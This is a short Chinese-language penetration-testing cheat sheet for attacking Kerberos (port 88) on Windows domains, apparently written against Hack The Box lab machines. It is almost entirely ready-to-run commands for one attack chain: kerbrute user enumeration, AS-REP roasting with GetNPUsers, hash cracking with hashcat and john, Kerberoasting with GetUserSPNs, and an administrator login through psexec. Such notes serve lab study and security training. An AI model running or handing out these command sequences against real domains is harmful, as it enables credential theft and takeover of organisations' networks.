---
description: 这是windows中的重点
---

# 88 （kerbrute）

windows中的重点关注

1. 爆破用户

```bash
/root/Desktop/tools/windows/kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
```

1. 检查AS-REP Roasting 可能会出hash

```bash
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
```

1.  爆破hash

    一般是18200，也可以检查一下

```bash
 hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
```

1. 已经拿到域内用户进一步突破

```bash
./GetUserSPNs.py -dc-ip 10.129.8.86 active.htb/SVC_TGS。  --先用这个枚举用户
./GetUserSPNs.py -dc-ip 10.129.8.86 active.htb/SVC_TGS -request     --在用这个获取票据
john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt    ---爆破
./psexec.py administrator@10.129.8.86。  --登陆
```
